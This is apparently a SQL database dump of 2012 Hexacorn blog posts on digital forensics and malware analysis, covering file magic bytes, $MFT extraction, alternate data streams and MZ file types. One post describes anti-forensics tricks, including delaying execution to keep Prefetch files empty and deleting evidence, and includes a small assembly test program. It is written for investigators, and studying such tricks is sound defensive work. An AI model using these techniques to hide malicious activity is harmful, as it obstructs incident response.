………..sZ;..\n…\nMSCF\nMicrosoft Cabinet File  (*.cab).\n4D 53 43 46 00 00 00 00 8E 07 3E 00 00 00 00 00  MSCF……>…..\n2C 00 00 00 00 00 00 00 03 01 01 00 01 00 00 00  ,……………\n…\nMZ\nWindows/DOS executable (*.exe, *.dll, *.sys, *.cpl, *.ocx, and others).\n4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ…………..\nB8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ……..@…….\n…\nOggS\nMusic file saved in OggS format (*.ogg).\n4F 67 67 53 00 02 00 00 00 00 00 00 00 00 67 0B  OggS……….g.\n00 00 00 00 00 00 46 7D C7 F2 01 1E 01 76 6F 72  ……F}…..vor\n…\nPK\nZip Archive;  used by Java (e.g. JAR files) and Microsoft Office 2007 (*.zip, *.jar, *.docx, and others).\n50 4B 03 04 14 00 02 00 00 00 F8 43 36 38 00 00  PK………C68..\n00 00 00 00 00 00 00 00 00 00 16 00 00 00 45 78  …………..Ex\n…\nRar!\nRar Archive (*.rar, *.r00, *.r01, …, part1.rar, part2.rar, …).\n52 61 72 21 1A 07 00 CF 90 73 00 00 0D 00 00 00  Rar!…..s……\n00 00 00 00 31 A3 74 C0 90 2E 00 3F F9 3B 00 00  ….1.t….?.;..\n…\nregf\nWindows registry file (*.dat, *.<no extension>).\n72 65 67 66 01 00 00 00 01 00 00 00 00 00 00 00  regf…………\n00 00 00 00 01 00 00 00 03 00 00 00 00 00 00 00  …………….\n…\nRIFF…ACON\nAnimated cursor (*.cur).\n52 49 46 46 50 3A 00 00 41 43 4F 4E 4C 49 53 54  RIFFP:..ACONLIST\n46 00 00 00 49 4E 46 4F 49 4E 41 4D 0B 00 00 00  F…INFOINAM….\n…\nRIFF…AVI\nAVI movie  (*.avi).\n52 49 46 46 88 51 5A 01 41 56 49 20 4C 49 53 54  RIFF.QZ.AVI LIST\n46 01 00 00 68 64 72 6C 61 76 69 68 38 00 00 00  F…hdrlavih8……\n…\nSZDD\nA file compressed with Microsoft program compress.exe  (*.??_ e.g. *.ex_ for compressed *.exe).\n53 5A 44 44 88 F0 27 33 41 65 00 74 00 00 FF 4D  SZDD..’3Ae.t…M\n5A 90 00 03 00 00 00 7D 04 F5 F0 FF FF 00 00 B8  Z……}……..\n…\n0x60 0xEA\nArj archive (*.arj).\n60 EA 2E 00 22 0B 01 0A 10 00 02 EB EB BC 86 3A  `...”……….:\nEB BC 86 3A 00 00 00 00 00 00 00 00 00 00 00 00  …:…………\n…\n0x78 0x01\nDMG image for Mac (*.dmg).\n78 01 ED 9D 0B 80 1D 55 7D FF 67 E6 3E F7 BE 76  x..….U}.g.>..v\n49 78 04 44 5C F3 8F 2B 41 B2 5D 48 08 81 50 59  Ix.D\\..+A.]H..PY\n…\n{\\rtf\nDocument saved in Rich Text Format (RTF) (*.rtf).\n7B 5C 72 74 66 31 5C 61 64 65 66 6C 61 6E 67 31  {\\rtf1\\adeflang1\n30 32 35 5C 61 6E 73 69 5C 61 6E 73 69 63 70 67  025\\ansi\\ansicpg\n…\n0x7F ELF\nLinux executable  (*.<no extension>, *.so).\n7F 45 4C 46 01 01 01 00 00 00 00 00 00 00 00 00  .ELF…………\n02 00 03 00 01 00 00 00 00 81 04 08 34 00 00 00  …………4…\n…\n0x89 PNG\nAn image saved in PNG format (*.png).\n89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52  .PNG……..IHDR\n00 00 03 D5 00 00 02 78 08 02 00 00 00 E4 DD 57  …….x…….W\n…\n0xCA 0xFE 0xBA 0xBE (CAFEBABE)\nJava file (*.class) or Mac Mach-O Universal binary (*.app).\nCA FE BA BE 00 00 00 32 00 C0 0A 00 30 00 6A 09  …….2….0.j.\n00 2F 00 6B 07 00 6C 08 00 6D 0A 00 03 00 6E 09  ./.k..l..m….n.\n…\n0xD0  0xCF  0x11 0xE0 (D0CF11E)\nCompound OLE file from Microsoft  (*.doc, *.xls, *.msi, and others).\nD0 CF 11 E0 A1 B1 1A E1 00 00 00 00 00 00 00 00  …………….\n00 00 00 00 00 00 00 00 3E 00 03 00 FE FF 09 00  ……..>…….\n…\n0xED 0xAB 0xEE 0xDB\nRed Hat Package Manager File (*.rpm).\nED AB EE DB 03 00 00 00 00 01 74 75 78 70 61 69  ….……tuxpai\n6E 74 2D 30 2E 39 2E 32 30 2D 31 2E 66 38 5F 66  nt-0.9.20-1.f8_f\n…\n0xEF 0xBB 0xBF\nText encoded in UTF8 (*.txt, *.utf8, and others).\nEF BB BF 54 68 69 73 20 69 73 20 61 20 73 69 6D  …This is a sim\n70 6C 65 20 74 65 78 74 20 66 69 6C 65 20 2E 2E  ple text file ..\n…\n0xFF 0xD8…JFIF\nPicture saved in a JPEG format (*.jpg, *.jpe, *.jpeg).\nFF D8 FF E0 00 10 4A 46 49 46 00 01 02 00 00 64  ……JFIF…..d\n00 64 00 00 FF FE 00 12 41 64 6F 62 65 20 49 6D  .d……Adobe Im\n…\n0xFE 0xFF\nText encoded in UTF16BE (*.txt, and others).\nFE FF 00 54 00 68 00 69 00 73 00 20 00 69 00 73  …T.h.i.s. .i.s\n00 20 00 61 00 20 00 73 00 69 00 6D 00 70 00 6C  . .a. .s.i.m.p.l\n…\n0xFF 0xFE\nText encoded in UTF16LE (*.txt, and others).\nFF FE 54 00 68 00 69 00 73 00 20 00 69 00 73 00  ..T.h.i.s. .i.s.\n20 00 61 00 20 00 73 00 69 00 6D 00 70 00 6C 00   .a. .s.i.m.p.l.\n…\n \nShare this :)', 'File Formats ZOO', 'http://www.hexacorn.com/blog/2012/04/30/file-formats-zoo/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (375, 'Permanent Link to Forensic Riddle #11', 'Hexacorn', 'April 27, 2012 ', 'It’s been a while since I posted a riddle, so here is a new one – this should be an easy one:\nTwo different Windows executables have been executed on the same version of Windows system and under identical (ideal) conditions. Dynamic analysis shown that each of them produces completely different artefacts  on a test system, but the in-depth code analysis shown that they have an identical source code. What files are these?\nAnswer here\n \n \nShare this :)', 'Forensic Riddles', 'http://www.hexacorn.com/blog/2012/04/27/forensic-riddle-11/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (376, 'Permanent Link to Speeding up case processing', 'Hexacorn', 'April 20, 2012 ', 'A few years back I was looking at a data from my first forensic case: few images, hundreds of thousands files and only a very limited time to look through it. Like many before me I found it overwhelming and hard to manage.\nI started a typical (and painful) journey through evidence playing around with data filtering using various criteria e.g. date, size, file extensions, I also tried hiding some of the data, and manually go through its subsets (e.g. by just looking at specific folders) and of course did some simple timeline analysis as well.\nI thought there must be a better way to walk through this mess than just clicking through a graphical user interface (GUI).\nAs many investigators before me and always wanting to automate things I soon started toying around with various optimization ideas. I ended up developing various one-off, quick and dirty scripts and solutions with the aim of speeding up my analysis. Some of them worked, some of them were complete non-sense. Here and in the future posts, I will demonstrate (I love using this big-mouth word :)) some of them. At least, these that worked for me :).\nFor starters, a couple of general optimization ideas – later I will come back to more specific examples:\n\nObvious ones first\n\nInvest in hardware – bigger, faster, more\nInvest in software, but do it wisely (better more hardware with no expensive software, than less hardware with more expensive software)\nExperiment, read and pick up new techniques from others\nAutomate stuff\nBenchmark everything you can\n\nExit your comfort zone and:\n\nLearn to program; this will enable you to code stuff, often, even smallest snippets of code can do lots of magic\nMove from GUI to command line (CLI); it is just faster & often OS-independent (+Linux CLI tools are faster); I am a Windows guy and it was EXTREMELY difficult to break through; I had a good Linux mentor though at that time and thanks to him I made a huge progress in adopting at least CLI interface and tools (this is actually funny, because in the past I was finding it really hard to change from CLI to GUI after I moved from DOS to Windows; what a sweet irony….)\nMove from CLI to use your own scripts/tools; it is faster and is also a way to automate and instrument things to work for you; even the best grep or CLI caterpillar (as I call endless list of CLI commands separated by pipes) cannot do what a simple script with a state machine/regexes can do\nWork on mounted data instead of data loaded into application (maybe it is subjective, but to me it always worked faster – I will come back to it in the future)\nWork on the same data on as many boxes as you can; at times, I have been working on the same data on 6 different machines via RDP and later combining data into one report; it is VERY HARD to manage, you will lose your mind, but it gives you an edge as you can simultaneously do different things (run strings on the whole image on one system, extract files on second, run multiple AV on another, and so on and so forth)\nUse data in raw DD format for analysis – if all fancy tools fail, you can quickly switch to CLI and save the day (it happened to me lots of times); Raw data also allows to run strings over it, so later if you need to grep for stuff, you can search within extracted strings reducing search time; (instead of DD you can also of course mount images)\nDivide work into steps that can be batch processed and/or processed simultaneously and independently; examples include:\n\nOnce you extract all .exe/.dll/etc. you can run AV over them, you can also run PE tools that highlight ‘funny’ stuff like high entropy, suspicious APIs, etc.\nLook at logical drives separately; don’t run massive searches on the whole evidence in one go on one system; in case something breaks, you can at least preserve some part of work done, and it  easier to restart on a subset of data than on the whole evidence\n\nActively search, collect and install tools; don’t just bookmark pages – when time is important (and it always is), having proper tools at hand saves a lot of time [downloading time, installation, etc.]\n\nChange the mindset and don’t just look at data – act on it\n\nGet a full copy of evidence data to your workstation on a local drive\nWhen you walk through it, analyze something and if it is not important  – delete it e.g. walking through folders/files that you have already seen:  just remove them; this way you can get rid of a lot of noise\nUse better file explorer e.g. Total Commander, FAR to walk through content of files (I strongly advice NOT to use CLI for walking through files – Total Commander with a Quick Preview on allows to walk through many files in no time);\n\nAs mentioned earlier – benchmark – both tools and ideas; it can’t be stressed enough; just because strings/grep work, doesn’t mean they are the fastest; your regex may be also wrong and as programmers know – not everything can be searched for using regex; state machine or some fancy dedicated algorithm is often a much better option, not to mention a script that at least partially understands file format being scanned and can choose to ignore e.g. certain file types\nCertain things in forensics are done, because ‘everyone does so’, even if it doesn’t make sense in certain cases, examples include:\n\nCalculating hashes of all files (it is a good idea ONLY if you will actually use them)\nRunning clean tools from read-only media (malware can obviously hook/patch/disable these when they are loaded from a file to memory)\nScanning with multiple AV systems (custom malware is omnipresent; let’s face the facts: AV will never detect them)\n\n\nThat’s it for now. This is to a great extent a subjective list of mine and should not be treated as a silver bullet. What worked for me & for my cases may not work for you. And quite frankly – forensics analysis is very often less sexy as an outsider may think – it is struggling against time, customer expectations and… fatigue. If faster case processing can at least reduce the workload it is definitely worth thinking of.\nGo ahead and create your own subjective list.\nShare this :)', 'Preaching', 'http://www.hexacorn.com/blog/2012/04/20/speeding-up-case-processing/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (377, 'Permanent Link to HMFT – Yet Another $MFT extractor', 'Hexacorn', 'April 16, 2012 ', 'HMFT is a simple tool that extracts $MFT from a given drive or a disk image to a file in any location (including removable drive).\nExtracting $MFT directly from a live system or even from an image is always a pain. Most of the tools available on the internet are GUI-driven, and GUI option is not always available (e.g. to remote users); such GUI-driven tools are also often not very ‘portable’ as they are bundled with other components and are written in a high-level language so the file size often goes to a few hundred KiBs, if not MiBs . As such, getting them on a target system may be annoying to say the least. There are of course good command line tools available as well, but they are often private, paid-only, or offering a limited functionality in its free version (not to mention the file size).\nNow, don’t get me wrong – this is not to boo at other tools – they are often excellent and very useful. Also, apart from extracting $MFT they often offer a lot of other functionality e.g. parsing various file systems, extracting files by name, etc. They are just written for a different purpose.\nInterestingly, the MFT extraction can be easily achieved within less than 1KB of code; HMFT is still far from an optimal size, but since it is written in X86 assembly and packed with UPX it ‘weights’ only 4KiB and I have no plans on optimizing it further. It is also quite fast and if you are lucky, extracting $MFT file should be a matter of seconds up to few minutes (it will take longer if for $MFT extracted from removable drives or if systems is under performing during the operation). HMFT reads NTFS directly and tries its best to parse its structure. It doesn’t rely on any 3rd party library, and doesn’t use commonly used FSCTL_* commands to retrieve data – it’s all plain Read/Write from the list of clusters that $MFT occupies.\nOnce extracted, $MFT can be parsed with analyzeMFT, mft.pl, or other scripts.\nNote:\n\nFor images, only images of volumes (logical drives) are supported at the moment.\nAs mentioned, while parsing NTFS is a major pain in general, extracting $MFT alone is relative simple, so I hope it will work OK. Still,  if you try it and for some reason something doesn’t work, please let me know and I will try to fix it.\n\nUsage:\nhmft.exe [drive] [output filename]\nf.ex.:\n\nDownload HMFT here.\nShare this :)', 'HMFT, Software Releases', 'http://www.hexacorn.com/blog/2012/04/16/hmft-yet-another-mft-extractor/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (378, 'Permanent Link to Update', 'Hexacorn', 'April 15, 2012 ', 'It’s been a while since I wrote anything here. This is due to me being on holidays and moving to a new place right after coming back. I finally settled down in a new apartment and looking forward to play with some new ideas.\nSo, here is a short update:\n\nI fixed a silly bug in HAPI – I mixed up CR & LF characters in the output and it looked awkward to say the least, not to mention potential parsing issues; Thx to Pedro L. for spotting this and notifying me\nHAPI may occasionally print some strings that look like non-API, e.g. ‘version’; this is not a bug, but a feature  it turns out that there is such an API exported by one of the Microsoft DLLs ; since I don’t want to miss any API, I made a trade off and include all of them; still… I use some little heuristics to prevent printing many of them, but some of them will sometimes go through; so, please always verify the output manually; and for the curious – some Microsoft programmers decided to name certain APIs using one, or two characters; I dunno why do you do stuff like this, but there are legitimate system DLLs exporting functions named ‘u’, ‘vo’, etc.\n\n\nDiscovered recently that Symantec’s VBN files can be encrypted not only with 0x5A, but also 0xA5; these files are still handled by DeXRAY since it relies on a XRAYS technique that searches and extracts encrypted executables without needing to know a specific key; but if you parse VBN files yourself, knowing that 0xA5 is being used may help you to save some time\n\nShare this :)', 'Batch Analysis, Compromise Detection, DeXRAY, File Formats ZOO, Forensic Analysis, Hexacorn, Inciden', 'http://www.hexacorn.com/blog/2012/04/15/update/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (379, 'Permanent Link to Good Alternate Data Streams (ADS)', 'Hexacorn', 'March 26, 2012 ', 'While ADS is not widely supported/used by many apps (maybe with a notable exception of malware :)), it can be still used for some interesting purposes. In this short article, I describe a few legitimate uses of ADS by Windows programs that I know of.\nIf you know some others or if you spot any mistake, please let me know. Thanks.\nThis post is loosely based on this Microsoft list, but it contains some more details and looks at these streams from a ‘forensic angle’.\n:$DATA\nStandard ADS representing a content of the file.\n:$WIMMOUNTDATA\nThis one is referenced by wimgapi.dll, wimserv.exe and recimg.exe (win8), but I don’t have more information about it.\n:TASKICON_%d\nThis one is referenced by ieframe.dll (win8).\n:Zone.Identifier\nThis is a name of a stream generated by Microsoft applications when user saves files to the local file system from a different security zone (e.g. Internet -> Disk).\n\nThe content of the file is just an information about the original Zone the file comes from:\n\nGood news: presence of the stream confirms (in a ‘most likely’  CYA fashion) the file has been downloaded from the internet.\nBad news: Interestingly enough, some malware samples attempt to delete the :Zone.Identifier ADS attached to their executables immediately after they are executed – I guess it’s  because they want to:\n\nremove the ‘flag’ from the file that highlights it as ‘downloaded from internet’ – yet another subtle anti-forensics in action\nensure that next time the file is launched (either via autostart entry or manually), it doesn’t pop up the ‘Are you surely sure you want to run this highly insecure program downloaded from the internetz’ message box\n\nThe code responsible for creating the :Zone.Identifier ADS is present in multiple system DLLs because the functionality is provided via IZoneIdentifier interface. The actual code adding stream is present in shell32.dll. (note: this and other code references is my best guess based on a quick grepping exercise on strings exported from all OS DLLs within system32 directory)\n:favicon\nThis is a less known ADS that is being used by Internet Explorer. It acts as a cache and stores the favicon of the web site that has been bookmarked by the user.\nIt can be stored in files Page.url:favicon:$DATA; newer versions of IE appear to be also using format Page.website:favicon:$DATA\nThe content is just an .ico file – it can be extracted from a live system using ‘more’ command:\n\nPreviewing the extracted icon in Irfanview (and resizing it since it’s 16×16 pixels) shows the following picture (in my example BMI bookmark):\nas shown in the properties window:\n\nThe good news: from a forensic perspective it could be an interesting information to provide in a final report if the user activities are discussed. Presence of this ADS indicates that the site the favicon refers to has been added most likely manually by the user (of course, ‘most likely’ in a CYA fashion since we can’t exclude 100% the possibility of malware adding it).\nThe bad news: if you want to experiment with this feature, I must warn you that various versions of IE are buggy when it comes to preserving the favicons. So, they may not be present on all versions of IE. I have not done an extensive study as I don’t have various versions of IE at hand, but quick & dirty experiments show that bookmarks I added under IE8 preserve :favicon stream, the IE9 doesn’t. Again, this is best to be tested for the particular version of IE.\nAgain, good news is that if you find it on the analyzed system, you may get some clues from it. And if you don’t find it, well – one less artifacts to look at \nIf you want to play around, use procmon and use filter Path Contains ‘favicon‘\nCode responsible for :favicon ADS can be found in ieframe.dll\n:OECustomProperty\nThis is a stream created by Microsoft Outlook Express/Windows Mail. I don’t have an example at hand.\nThe code is stored in inetcomm.dll.\n:Encryptable\nAttached to Thumbs.db files and created when pictures are viewed in Thumbnail mode.\n\nThe same directory enumerated for ADS before thumbnail and after turning into Thumbnail mode\n\nThe code is stored in thumbcache.dll.\nDocument Properties Stream Name\nThis is a ‘garbage’ ADS one can see immediately after playing around with properties of a file stored inside a folder. The most known ADS is probably  ‘{4c8cc155-6c1e-11d1-8e41-00c04fb9386d}‘ (you can often see it in Procmon output).\nCreating these is easy – one needs to e.g. change the title in the file properties box:\n\nThe same directory enumerated for ADS before the and after changing the title:\n\nAFP_AfpInfo and AFP_Resource\nMacintosh streams as explained on Microsoft web site. I don’t have more info about this one.\n{59828bbb-3f72-4c1b-a420-b51ad66eb5d3}.XPRESS\nXPRESS Stream is used during remote differential compression as explained on Microsoft web site. XPRESS is a compression algorithm and streams appear to be using when the compressed data is being downloaded. I don’t have more info about this one and at the moment I don’t know how to create a demo (show its creation on the system). Googling around, one can come across similarly named streams e.g.\n\n{59828bbb-3f72-4c1b-a420-b51ad66eb5d3}.rdc.1\n{59828bbb-3f72-4c1b-a420-b51ad66eb5d3}.rdc.2\n\nShare this :)', 'Forensic Analysis', 'http://www.hexacorn.com/blog/2012/03/26/good-alternate-data-streams-ads/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (380, 'Permanent Link to Zoom. Enhance.', 'Hexacorn', 'March 26, 2012 ', 'This post won’t make you smarter. Move on. You have been warned \n \nThis article on Wired talks about Mikko Hypponen’s war on malware. I haven’t read it \nWhat caught my attention was a screenshot of Hiew showing some err… malware.\nIt triggered my interest so I investigated it by looking at it closer:\n\nZoom. Enhance. Hiew 7.10 has been used. Current version is 8.22. This is an old screenshot.\nZoom. Enhance. With the right equipment it can be enhanced\n\nHiew: AgtX0408.exe\nGoogling around for AgtX0408.exe brings us the following link:\nhttp://activex.microsoft.com/activex/controls/agent2/AgtX0408.exe\nDownloaded the file\nThe visual comparison brings us the following result:\n \n\nBingo.\nConclusion: image recycling at work & this is not a malware.\nShare this :)', 'Silly', 'http://www.hexacorn.com/blog/2012/03/26/zoom-enhance/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (381, 'Permanent Link to The shortest anti-forensics code in the world – take #2', 'Hexacorn', 'March 16, 2012 ', 'In my older post, I claimed that replacing command line buffer is the shortest anti-forensics code as it takes 25 bytes only.\nSorry, I lied.\nThere are many ways to come up with a much shorter anti-forensics code. I will describe three ideas here. All of them are super obvious.\n#1\nJust use CopyFile function and copy Notepad.exe or any other file always present on the system over the file that is meant to be deleted (before its deletion). You may need some extra bytes for the file names, but well, it’s just one API call that it takes to implement a simple secure deletion.\n#2\nThe second idea came (indirectly) from Harlan Carvey. He has been recently writing about his ongoing work to improve Prefetch file parsing script. While reading the MSDN article he referred to, I stumbled upon a description that I have read many times before, but never really thought of it from the anti-forensic angle.\nIn order to know what it should prefetch, the Windows XP Cache Manager monitors the page faults, both those that require that data be read from disk (hard faults) and those that simply require that data already in memory be added to a process’s working set (soft faults), that occur during the boot process and application startup. By default it traces through the first two minutes of the boot process, 60 seconds following the time when all Win32 services have finished initializing, or 30 seconds following the start of the user’s shell (typically Microsoft Internet Explorer), whichever of these three events occurs first. The Cache Manager also monitors the first 10 seconds of application startup.\nRead the last sentence one more time:\nThe Cache Manager also monitors the first 10 seconds of application startup.\nThat is.\nTo reduce a number of forensically useful artifacts stored inside a Prefetch file, all the application has to do is… wait for 10 seconds. This can be easily achieved by running a function Sleep or NtDelayExecution at the entry point. Of course, there are extra bytes needed to import the function, etc., but since malware is often using one of these API anyway, a few bytes is what it takes.\nI ran a quick test and it works as described:\nThe same code executed without any delay produced this Prefetch file:\nGeneral information :\r\n  Filename  : PREFTEST.EXE\r\n  Run count : 1\r\n  Run time  : Fri Mar 16 17:29:33 2012 (UTC)\r\n\r\nPrefetch file information:\r\n  Reported size     : 2468\r\n  Real size         : 2468\r\n  Last access time  : Fri Mar 16 17:29:48 2012 (UTC)\r\n  Modification time : Fri Mar 16 17:29:43 2012 (UTC)\r\n  Creation time     : Fri Mar 16 17:29:48 2012 (UTC)\r\n\r\nFilepaths block (1240) :\r\n  \\DEVICE\\HARDDISKVOLUME1\\WINDOWS\\SYSTEM32\\NTDLL.DLL\r\n  \\DEVICE\\HARDDISKVOLUME1\\WINDOWS\\SYSTEM32\\KERNEL32.DLL\r\n  \\DEVICE\\HARDDISKVOLUME1\\WINDOWS\\SYSTEM32\\UNICODE.NLS\r\n  \\DEVICE\\HARDDISKVOLUME1\\WINDOWS\\SYSTEM32\\LOCALE.NLS\r\n  \\DEVICE\\HARDDISKVOLUME1\\WINDOWS\\SYSTEM32\\SORTTBLS.NLS\r\n  \\DEVICE\\HARDDISKVOLUME1\\WINDOWS\\PREFETCH\\PREFTEST.EXE\r\n  \\DEVICE\\HARDDISKVOLUME1\\WINDOWS\\PREFETCH\\FILE.TXT\r\n\r\nVolume information block (1976) :\r\n  Volume Path   : \\DEVICE\\HARDDISKVOLUME1\r\n  Serial Number : 1216058920\r\n  Creation Time : Sun Jan  6 13:31:42 2008 (UTC)\r\n  \\DEVICE\\HARDDISKVOLUME1\\\r\n  \\DEVICE\\HARDDISKVOLUME1\\WINDOWS\\\r\n  \\DEVICE\\HARDDISKVOLUME1\\WINDOWS\\PREFETCH\\\r\n  \\DEVICE\\HARDDISKVOLUME1\\WINDOWS\\SYSTEM32\\\nand after adding at least 10 seconds delay at its entry point we get the following result:\nGeneral information :\r\n  Filename  : PREFTEST.EXE\r\n  Run count : 1\r\n  Run time  : Fri Mar 16 17:30:30 2012 (UTC)\r\n\r\nPrefetch file information:\r\n  Reported size     : 2304\r\n  Real size         : 2304\r\n  Last access time  : Fri Mar 16 17:30:46 2012 (UTC)\r\n  Modification time : Fri Mar 16 17:30:40 2012 (UTC)\r\n  Creation time     : Fri Mar 16 17:30:46 2012 (UTC)\r\n\r\nFilepaths block (1184) :\r\n  \\DEVICE\\HARDDISKVOLUME1\\WINDOWS\\SYSTEM32\\NTDLL.DLL\r\n  \\DEVICE\\HARDDISKVOLUME1\\WINDOWS\\SYSTEM32\\KERNEL32.DLL\r\n  \\DEVICE\\HARDDISKVOLUME1\\WINDOWS\\SYSTEM32\\UNICODE.NLS\r\n  \\DEVICE\\HARDDISKVOLUME1\\WINDOWS\\SYSTEM32\\LOCALE.NLS\r\n  \\DEVICE\\HARDDISKVOLUME1\\WINDOWS\\SYSTEM32\\SORTTBLS.NLS\r\n  \\DEVICE\\HARDDISKVOLUME1\\WINDOWS\\PREFETCH\\PREFTEST.EXE\r\n\r\nVolume information block (1824) :\r\n  Volume Path   : \\DEVICE\\HARDDISKVOLUME1\r\n  Serial Number : 1216058920\r\n  Creation Time : Sun Jan  6 13:31:42 2008 (UTC)\r\n  \\DEVICE\\HARDDISKVOLUME1\\\r\n  \\DEVICE\\HARDDISKVOLUME1\\WINDOWS\\\r\n  \\DEVICE\\HARDDISKVOLUME1\\WINDOWS\\PREFETCH\\\r\n  \\DEVICE\\HARDDISKVOLUME1\\WINDOWS\\SYSTEM32\\\nSo, if you come across an empty Prefetch file in the future, don’t be surprised \nI used this script by Jean François Gingras to parse Prefetch files.\nAnd this is a source of a masm32 code I used in a test:\n.586\r\n .MODEL FLAT,STDCALL\n include    windows.inc\r\n include    kernel32.inc\r\n includelib kernel32.lib\r\n include    user32.inc\r\n includelib user32.lib\r\n\r\n .data\r\n file db \'file.txt\',0\r\n\r\n .data?\r\n numOfBytesRead dd ?\r\n buffer db 256 dup(?)\r\n\r\n .code\r\n Start:\r\n ;  invoke Sleep,15*1000\r\n invoke CreateFileA, OFFSET file, \\\r\n GENERIC_READ, \\\r\n FILE_SHARE_READ or FILE_SHARE_WRITE, \\\r\n NULL, \\\r\n OPEN_EXISTING, \\\r\n FILE_ATTRIBUTE_NORMAL, \\\r\n NULL\r\n invoke ReadFile, eax, \\\r\n OFFSET buffer, \\\r\n SIZEOF buffer, \\\r\n OFFSET numOfBytesRead, \\\r\n NULL\r\n ; invoke Sleep,15*1000\r\n invoke ExitProcess,-1\r\n END Start\nAll you have to do is uncomment one of the lines ‘; invoke Sleep,15*1000‘ – first one, if you want to keep the Prefetch file clean, and second one if you want to see ‘file.txt’ inside the Prefetch file associated with the executable. Note, for the .pf file to be created program needs to run for at least 10 seconds and actually read the file.\nThis sort of tricks may sound like a good idea, but as many forensic investigators already know – and as pointed out by Harlan who commented on one of my previous posts here – that (quoting) “the absence of an artifact where you expect to find one is itself an artifact”. Indeed. Not having any file listed inside the Prefetch file doesn’t change the fact that its sole presence indicates the executable _has_ been ran and some useful forensic data can still be fetched from the *.pf files even if they are kind of empty.\nThis leads me to the third idea that is the most obvious.\n#3\nMalware can either delete the prefetch file, or use some way to hide it e.g. using PrefetchADS technique I described in one of my forensic riddles. This also can be achieved with one API call.\n \nSo, there you have it. Anti-forensics, counter-forensics, or forensics prevention can be implemented in a simple and very effective way. And even if they can’t fool an experienced investigator, they surely can take lots of fun from investigation, increase time spent on chasing after ghosts and remove all the juice from the final report. After all, it’s the ‘smoking gun’ that we all want to show, not a circumstantial evidence that leaves many questions unanswered.\nShare this :)', 'Anti-Forensics', 'http://www.hexacorn.com/blog/2012/03/16/the-shortest-anti-forensics-code-in-the-world-take-2/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (382, 'Permanent Link to MZ File format flavors & malware', 'Hexacorn', 'March 10, 2012 ', 'Analyzing files starting with the ‘MZ’ magic value can be called a “daily bread” for reverse engineers. The reason for this is pretty simple – if you look at the top of your average executable file you will notice that majority of them start with these 2 magic letters. Since it’s the most common file format that malware analysts work with, in this post I will have a deeper (but still high-level) look at files of this type.\nThere are so many types of executables starting with ‘MZ’ that looking at the first 2 bytes is often not enough. In fact, there are so many various flavors of MZ files, that it’s pretty hard to list them all, but let’s try anyway:\n\n16-bit, 32-bit and 64-bit executables\nPC and mobile executables\nx32, x64, IA64, AMD64, etc.\n.NET\nExecutables for Windows 3.1 and Windows 9x/NT ( ‘NE’ vs. ‘PE’)\nDrivers for Windows 3.1/Windows 9x and Windows NT ( ‘LE’ vs. ‘PE’)\nGUI applications and console applications\nUser mode executables (processes, services – usually saved as files with the .exe, .scr, .cpl extension) and Dynamically Loaded Libraries (saved as files with .dll extension; others are saved as .ocx, .vbx, etc.)\nUser mode executables (processes) and services (service processes)\nKernel mode drivers (.sys, .drv) and kernel mode libraries (also saved with a .sys file extension)\nStandard DLLs and COM DLLs (e.g. ActiveX, Browser Helper Objects)\nStandard DLLs and Service DLLs (loaded by svchost.exe)\nDedicated DLL files (e.g. LSP, Shell extensions, deskbands, Plugins, MSGINA, windows hooks, etc.)\nOld-school standalone executables (‘DOS type’)\nFiles produced by various compilers: Microsoft Visual Studio, Borland Delphi, Visual Basic, mingw32, gcc and many more.\nFiles produced by various script compilers e.g. perl2exe, py2exe, php2exe, AutoIt, WinBatch, etc.\nInstallers e.g. Nullsoft, InnoSetup, Wise, Vyse, etc.,\nResource-only files e.g. fonts\nExecutables with overlays\nExecutables with appended data\n…\n\nFrom malware analysis point of view, we have to also include another categorization as well, which is very much related to “extra” file properties often added by malware authors, including:\n\ncompression (packing)\nencryption\nwrapping\nobfuscation\nprotection\ncorruption\nvirtualization\nmisleading information\nanti-techniques\n\nFinally, we can use as a classifier the presence and the content of the following metadata:\n\nRich header\nNumber of Sections\nCharacteristics of Sections (writable, readable, executable, etc.)\nCharacteristics of Import and export table\nDebugging information (including timestamps and paths to .PDB files)\nResources information\nDigital signatures\nAppended data\nCompiler specific information e.g. debug information, or PACKAGEINFO for Delphi application\n\nIt is super high-level, but as you may guess, analyzing any single executable listed on this list requires completely different approach.\n \nUpdate #1:\nfixed a mistake related to NE/PE – NE files have been replaced by PE files on 32-bit Windows; thx to Imaginative (one of the best reversers I know) for picking it up \nUpdate #2:\nJust to clarify: NE files still run on Win XP + this file format is being used to store .fon files (Thx Ange @ corkami.com – he is one of the best binary magicians out there!)\nShare this :)', 'Malware Analysis', 'http://www.hexacorn.com/blog/2012/03/10/mz-file-format-flavours-malware/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (383, 'Permanent Link to HAPI – API extractor', 'Hexacorn', 'March 3, 2012 ', 'Note\nThis software has been discontinued. Please use HexDive (it has all HAPI features plus lots more).\nAlso, check our other tools.\nOld post\nIn one of my previous posts (Extracting Strings from PE sections), I demonstrated (ya… right, what a big word)  how easy it is to extract sections of PE file into separate files using 7-Zip so that they can be later used for targeted strings analysis. As I mentioned, splitting a file into sections can be really useful as it helps to reduce a number of random string-alike non-strings we see in the output of  ‘strings’ type of tools. Just to be on a secure side though – you may want to refer to my original post to find out more about caveats of such approach as there are cases when it may not be such a good idea.\nThere are many other techniques that can help in noise reduction and I am going to demonstrate one more today.\nAnalyzing Portable Executable (PE) files usually kicks off with running multiple static analysis tools including ‘strings’ and other tools that can help in determining what APIs are being used by a sample. One can use tools like PEDump, LordPE, PETools, Stud_PE, Dependency Walker, and lots of others that process sample’s import/export tables and help guessing what specific functionality is embedded in the 